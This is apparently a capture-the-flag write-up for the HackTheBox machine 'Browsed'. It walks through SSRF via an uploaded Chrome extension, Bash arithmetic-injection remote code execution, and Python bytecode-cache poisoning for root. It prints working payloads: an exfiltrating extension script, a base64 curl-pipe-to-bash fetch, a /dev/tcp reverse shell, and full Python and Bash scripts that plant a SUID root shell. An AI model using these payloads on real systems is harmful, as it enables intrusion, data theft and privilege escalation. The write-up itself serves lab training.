---
icon: firefox-browser
cover: ../../../../.gitbook/assets/Screenshot 2026-03-28 233110.png
coverY: -2.3449487582569764
---

# HTB-BROWSED

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning

Starting with a rustscan to find open ports quickly.

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ rustscan -a 10.10.8.1 Blah Blah
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Just two ports. SSH is usually a dead end without creds, so web it is. The OpenSSH and nginx versions point to Ubuntu 24.04 noble.

#### Web Enumeration

<figure><img src="../../../../.gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>

Navigating to `http://10.10.8.1` shows a browser extension marketplace kind of site called "Browsed". The header leaks a domain name, so I add `browsed.htb` to `/etc/hosts`. Looking around the site there are three main pages the homepage, a samples page with downloadable example extensions, and an upload page at `/upload.php` where you can submit Chrome extensions for a developer to review.

<figure><img src="../../../../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

That upload functionality is interesting. Something is processing these extensions server-side, which smells like an attack vector.

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ feroxbuster -u http://10.10.8.1 -x php
```

```
200      GET      170l      482w     6979c http://10.10.8.1/upload.php
200      GET       85l      366w     4641c http://10.10.8.1/samples.html
200      GET      165l      599w     6708c http://10.10.8.1/index.html
301      GET        7l       12w      178c http://10.10.8.1/images => http://10.10.8.1/images/
snip...
```

Nothing else interesting from feroxbuster.

#### Chrome Logs and VHost Discovery

I download one of the sample extensions from the samples page, zip it up and upload it. The upload hangs for a few seconds then returns a massive wall of Chrome debug logs. This tells us something important the site is running a headless Chrome instance to "review" uploaded extensions. An actual browser is loading whatever we upload.

Digging through the log output, I grep for URL requests:

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ cat logs.txt | grep NetworkDelegate::NotifyBeforeURLRequest | grep -oP 'https?://\S+'
```

```
http://clients2.google.com/time/1/current?[...snip...]
http://browsedinternals.htb/
http://localhost/
https://accounts.google.com/ListAccounts[...snip...]
http://browsedinternals.htb/assets/css/index.css?v=1.24.5
http://browsedinternals.htb/assets/css/theme-gitea-auto.css?v=1.24.5
[...snip...]
```

There it is. The browser is visiting `browsedinternals.htb` and loading Gitea-specific CSS. Also notable there's a DevTools websocket:

```
DevTools listening on ws://127.0.0.1:35435/devtools/browser/f9ca757b-3f14-4a45-987a-0a1afdf851a8
```

I add `browsedinternals.htb` to `/etc/hosts` and check it out.

#### Internal Gitea Instance

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ curl -s http://browsedinternals.htb/ | grep -i gitea
```

It's a Gitea instance, version 1.24.5. There's one public repo — `larry/MarkdownPreview`. Even though "internals" is in the name, it's accessible from outside. That feels intentional as part of the box design.

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ git clone http://browsedinternals.htb/larry/MarkdownPreview.git
```

```
Cloning into 'MarkdownPreview'...
remote: Enumerating objects: 15, done.
remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), done.
```

***

### Source Code Review

The repo contains two key files `app.py` which is a Flask app, and `routines.sh` which is a Bash maintenance script.

#### app.py Analysis

```python
from flask import Flask, request, send_from_directory, redirect
from werkzeug.utils import secure_filename
import markdown
import os, subprocess
import uuid

app = Flask(__name__)
FILES_DIR = "files"

@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

# The webapp should only be accessible through localhost
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

The app runs on `localhost:5000` only — so it's not directly reachable from outside. The `/routines/<rid>` endpoint takes user input and passes it to a shell script. `subprocess.run` with a list instead of `shell=True` means direct command injection won't work here. But the Bash script it calls might have its own issues.

#### routines.sh Analysis

```bash
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

if [[ "$1" -eq 0 ]]; then
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"

elif [[ "$1" -eq 2 ]]; then
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;

elif [[ "$1" -eq 3 ]]; then
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
else
  log_action "Unknown routine ID: $1"
fi
```

The comparison `[[ "$1" -eq 0 ]]` uses Bash arithmetic evaluation with `-eq`. This is the vulnerability. When Bash does arithmetic comparison, it evaluates the expression, and that evaluation supports array subscript syntax including command substitution. So something like `a[$(id)]` will execute `id` during the comparison.

The attack chain is: SSRF via Chrome extension → reach the internal Flask app on port 5000 → trigger the Bash arithmetic injection in `routines.sh`.

***

### SSRF via Chrome Extension

#### Why This Works

When we upload an extension, headless Chrome loads and executes it. Chrome extension service workers run in a background context that isn't subject to the same CORS restrictions as content scripts. If we declare `host_permissions` for localhost, the service worker can freely make requests to `127.0.0.1` giving us SSRF into any internal service.

<figure><img src="../../../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

You can Check Here For More Details

{% embed url="https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html#main-components" %}

#### Building the SSRF Extension

First, let me verify the Flask app is actually reachable. I'll build a simple extension that fetches `localhost:5000` and sends the response back to me.

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ mkdir ssrf_test && cd ssrf_test
```

`manifest.json`:

```json
{
    "manifest_version": 3,
    "name": "Test",
    "version": "1.0",
    "background": {
        "service_worker": "background.js"
    },
    "host_permissions": [
        "*://127.0.0.1/*",
        "*://localhost/*"
    ]
}
```

`background.js`:

```javascript
fetch("http://localhost:5000/")
  .then(r => r.text())
  .then(d => fetch("http://10.10.15.118:8000/?d=" + btoa(d)));
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed/ssrf_test]
└─$ zip -r ../ssrf_test.zip *
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ python3 -m http.server 8000
```

Upload the zip, and almost immediately:

```
10.10.8.1 - - [xx/xxx/2026] "GET /?d=CiAgICA8aDE+TWFya2Rvd24gUHJldmlld2VyPC9oMT4K..." 200 -
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ echo "CiAgICA8aDE+TWFya2Rvd24gUHJldmlld2VyPC9oMT4K..." | base64 -d
```

```html
<h1>Markdown Previewer</h1>
<form action="/submit" method="POST">
    <textarea name="content" rows="10" cols="80"></textarea><br>
    <input type="submit" value="Render & Save">
</form>
<p><a href="/files">View saved HTML files</a></p>
```

We're talking to the internal Flask app. Now to exploit the `routines` endpoint.

***

### Bash Arithmetic Injection - Getting a Shell

#### The Vulnerability Explained

The `-eq` operator in Bash triggers arithmetic evaluation. Inside that evaluation context, Bash processes array subscript expressions, which means `$()` command substitution gets executed. So if we pass `a[$(command)]` as the routine ID, the command runs before the comparison even completes.

Quick local test to confirm:

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ bash -c '[[ "a[$(id >&2)]" -eq 0 ]]'
```

```
uid=1000(sn0x) gid=1000(sn0x) groups=1000(sn0x)
```

That executes `id`. Now we need to get a reverse shell through this. Flask has trouble with slashes in URL paths even when URL-encoded, so I'll base64-encode the actual shell payload to avoid that problem.

#### Crafting the Payload

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ echo -n 'bash -c "curl http://10.10.15.118:8000/shell.sh | bash"' | base64 -w0
```

```
YmFzaCAtYyAiY3VybCBodHRwOi8vMTAuMTAuMTUuMTE4OjgwMDAvc2hlbGwuc2ggfCBiYXNoIg==
```

My `shell.sh` on the attacker machine:

```bash
bash -i >& /dev/tcp/10.10.15.118/9001 0>&1
```

#### The Exploit Extension

Now I update `background.js` to hit the vulnerable endpoint:

```javascript
fetch('http://127.0.0.1:5000/routines/a[$(base64 -d <<< YmFzaCAtYyAiY3VybCBodHRwOi8vMTAuMTAuMTUuMTE4OjgwMDAvc2hlbGwuc2ggfCBiYXNoIg==|bash)]+42');
```

The `+42` at the end makes the arithmetic expression valid enough for Bash to process it, ensuring the command substitution actually executes. The payload decodes and pipes through bash, which fetches our shell script and executes it.

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
```

Start the HTTP server for shell.sh, zip and upload the extension:

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000
10.10.8.1 - - "GET /shell.sh HTTP/1.1" 200 -
```

```
connect to [10.10.15.118] from (UNKNOWN) [10.10.8.1] 42078
bash: cannot set terminal process group (1437): Inappropriate ioctl for device
larry@browsed:~/markdownPreview$
```

There's also an SSH key in `~/.ssh/id_ed25519` and it's already in `authorized_keys`, so I grab it for a stable connection going forward.

***

### Privilege Escalation - Python Bytecode Cache Poisoning

#### Enumeration

```
larry@browsed:~$ sudo -l
```

```
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

Can run a Python script as root with no password. Let's look at what we're working with:

```
larry@browsed:~$ ls -laR /opt/extensiontool/
```

```
/opt/extensiontool/:
drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
drwxr-xr-x 4 root root 4096 Aug 17 12:55 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__
```

The `__pycache__` directory is `777` world writable. That's the key finding here. The main script imports from `extension_utils`, and Python will use cached bytecode from `__pycache__` if it exists and appears fresh. If we can replace that bytecode with something malicious, it'll execute as root when we run the script with sudo.

#### Understanding Python's Bytecode Cache

When Python imports a module, it checks `__pycache__` for a compiled `.pyc` file. The freshness check is timestamp-based: if the `.pyc` modification time is greater than or equal to the source `.py` file's mtime, Python trusts the bytecode and loads it directly without ever verifying that the bytecode actually corresponds to the source.

The `.pyc` header structure is:

```
Bytes 0-3  : Magic number (Python version identifier)
Bytes 4-7  : Bit field (all zeros = timestamp mode)
Bytes 8-11 : Source file modification timestamp
Bytes 12-15: Source file size
Bytes 16+  : Marshaled code object
```

So to poison the cache, we need to:

1. Match the source file's exact size
2. Match the source file's timestamp
3. Have valid Python 3.12 magic number
4. Have our malicious code as the actual bytecode

Since `__pycache__` is writable, we can delete the existing `.pyc` and drop in our own.

#### The Exploit

```
larry@browsed:~$ stat /opt/extensiontool/extension_utils.py
```

```
  File: /opt/extensiontool/extension_utils.py
  Size: 1245      Blocks: 8   IO Block: 4096   regular file
Modify: 2025-03-23 10:56:19.000000000 +0000
```

Source is 1245 bytes, modified March 23 2025. Our poisoned source needs to be exactly 1245 bytes with the same timestamp.

I'll write a Python exploit script that handles all of this automatically:

```python
#!/usr/bin/env python3.12
import marshal
import subprocess
from pathlib import Path

BASE_DIR = Path("/opt/extensiontool")
pyc = BASE_DIR / "__pycache__/extension_utils.cpython-312.pyc"
orig = BASE_DIR / "extension_utils.py"

# Run once to ensure .pyc exists
print("[*] Generating initial .pyc file")
subprocess.run(["sudo", str(BASE_DIR / "extension_tool.py"),
                "--ext", "Fontify"], capture_output=True)

# Grab the legitimate header (16 bytes)
# This has the correct magic number, timestamp, and file size
print("[*] Reading legitimate header")
raw_header = pyc.read_bytes()[:16]

# Build malicious source — same content plus payload appended
print("[*] Building poisoned source")
orig_src = orig.read_text()
poisoned_src = orig_src + "\nimport os\nos.system('cp /bin/bash /tmp/bash; chmod 6777 /tmp/bash')\n"

# Pad with comments to match original file size exactly
orig_size = orig.stat().st_size
padding = orig_size - len(poisoned_src.encode())
if padding > 0:
    poisoned_src += "#" * padding

# Compile the malicious source to bytecode
print("[*] Compiling malicious bytecode")
code = compile(poisoned_src, str(orig), "exec")

# Replace the .pyc with our poisoned version
print("[*] Replacing .pyc in __pycache__")
pyc.unlink()
pyc.write_bytes(raw_header + marshal.dumps(code))

# Trigger execution as root
print("[*] Triggering sudo execution")
subprocess.run(["sudo", str(BASE_DIR / "extension_tool.py"),
                "--ext", "Fontify"], capture_output=True)

# Check if it worked
shell = Path("/tmp/bash")
if shell.exists():
    print("[+] SUID bash created. Popping root shell.")
    subprocess.run(["/tmp/bash", "-p"])
else:
    print("[-] Something went wrong")
```

The trick with grabbing the legitimate header first is that it already has the correct magic number, the correct timestamp matching the source file, and the correct file size — all the things Python checks for freshness. We just swap out the code object portion with our malicious bytecode.

```
┌──(sn0x㉿sn0x)-[~/HTB/Browsed]
└─$ python3 -m http.server 8000
```

```
larry@browsed:~$ wget http://10.10.15.118:8000/exploit.py -O /dev/shm/exploit.py
larry@browsed:~$ python3.12 /dev/shm/exploit.py
```

```
[*] Generating initial .pyc file
[*] Reading legitimate header
[*] Building poisoned source
[*] Compiling malicious bytecode
[*] Replacing .pyc in __pycache__
[*] Triggering sudo execution
Traceback (most recent call last):
  File "/opt/extensiontool/extension_tool.py", line 5, in <module>
    from extension_utils import validate_manifest, clean_temp_files
ImportError: cannot import name 'validate_manifest' from 'extension_utils'
[+] SUID bash created. Popping root shell.
bash-5.2#
```

The ImportError is expected — our poisoned module doesn't export `validate_manifest` cleanly. But that error comes after the module-level code already ran, which is where our payload sits. The SUID bash is created before Python even gets to raise the exception.

```
bash-5.2# id
uid=1000(larry) gid=1000(larry) euid=0(root) egid=0(root) groups=0(root),1000(larry)
```

***

#### Alternative Approach: Bash Script Method

There's also a pure-Bash way to do this without writing a Python exploit. The idea is the same but done manually — construct a source file of the exact right size, copy its timestamp, compile it, then replace the cache:

```bash
#!/bin/bash
SOURCE='/opt/extensiontool/extension_utils.py'
TARGET_DIR='/opt/extensiontool/__pycache__'
PAYLOAD="import os\nos.system('install -m 6777 /bin/bash /tmp/bash2')"
TEMP="/dev/shm/extension_utils.py"

FILE_SIZE=$(stat --format="%s" "${SOURCE}")
PADDING=$(printf '#%.0s' $(seq 1 $((FILE_SIZE - ${#PAYLOAD}))))
PAYLOAD="${PAYLOAD}${PADDING}"
echo -e "${PAYLOAD}" > "${TEMP}"
touch -r "${SOURCE}" "${TEMP}"
python3.12 -m compileall "$(dirname ${TEMP})" >/dev/null
rm --force "${TARGET_DIR}"/*
cp "$(dirname ${TEMP})/__pycache__"/* ${TARGET_DIR}
sudo /opt/extensiontool/extension_tool.py --ext Fontify
/tmp/bash2 -p
```

Both approaches work, the Python one is cleaner because it handles the header manipulation properly using marshal.

***

### Attack Flow

```
[ATTACKER: 10.10.15.118]
         |
         | Upload malicious Chrome extension (.zip)
         v
[10.10.8.1:80] nginx / upload.php
         |
         | Headless Chrome loads extension
         | Service worker executes (background.js)
         v
[Headless Chrome — localhost context]
         |
         | fetch("http://127.0.0.1:5000/routines/a[$(...)]+42")
         | SSRF reaches internal Flask app
         v
[127.0.0.1:5000] Flask / routines.sh
         |
         | Bash arithmetic evaluation: [[ "a[$(cmd)]" -eq 0 ]]
         | Command substitution executes our payload
         | curl http://10.10.15.118:8000/shell.sh | bash
         v
[SHELL AS: larry]
         |
         | sudo -l -> (root) NOPASSWD: /opt/extensiontool/extension_tool.py
         | ls -la __pycache__ -> drwxrwxrwx (world-writable!)
         v
[Python Bytecode Cache Poisoning]
         |
         | Read legitimate .pyc header (correct magic/timestamp/size)
         | Compile malicious source -> marshal.dumps(code)
         | Write raw_header + malicious bytecode -> __pycache__/*.pyc
         | Python loads poisoned .pyc as root (no integrity check)
         | Payload: cp /bin/bash /tmp/bash; chmod 6777 /tmp/bash
         v
[/tmp/bash -p]
         |
         v
[SHELL AS: root — euid=0]
```

***

### Techniques I Used

| Technique                                                     | Where Used                                        |
| ------------------------------------------------------------- | ------------------------------------------------- |
| Chrome extension service worker abuse                         | SSRF via headless browser sandbox                 |
| SSRF to internal service                                      | Reaching Flask app on localhost:5000              |
| Bash arithmetic evaluation injection (`-eq` with `a[$(cmd)]`) | RCE via routines.sh parameter                     |
| Base64 payload encoding to bypass URL path restrictions       | Smuggling shell command through Flask URL routing |
| Python `__pycache__` bytecode poisoning                       | Privilege escalation via world-writable cache dir |
| `.pyc` header reuse (magic + timestamp + size)                | Bypassing Python's freshness validation           |
| SUID bash via `chmod 6777`                                    | Persistent root access after privesc              |
| Chrome debug log analysis                                     | VHost discovery (browsedinternals.htb)            |

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
